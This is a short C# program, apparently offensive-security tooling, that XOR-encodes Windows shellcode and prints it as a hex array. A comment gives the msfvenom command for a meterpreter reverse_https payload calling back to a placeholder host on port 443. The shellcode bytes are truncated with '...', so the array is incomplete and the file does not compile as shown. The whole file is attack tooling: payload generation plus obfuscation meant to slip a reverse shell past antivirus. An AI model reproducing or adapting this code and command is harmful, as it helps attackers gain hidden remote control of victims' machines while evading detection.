using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XOREncryption
{
    class Program
    {
        static void Main(string[] args)
        {
            // sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=XXX LPORT=443 EXITFUNC=thread -f csharp | tr -d '\n'
            byte[] buf = new byte[744] { 0xfc, 0x48, 0x83, 0xe4 ... };

            byte key = 0x02; // XOR Key

            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                // Encrypting each byte using the XOR operator
                encoded[i] = (byte)(buf[i] ^ key);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                // Converting the encrypted bytes to hexadecimal format
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}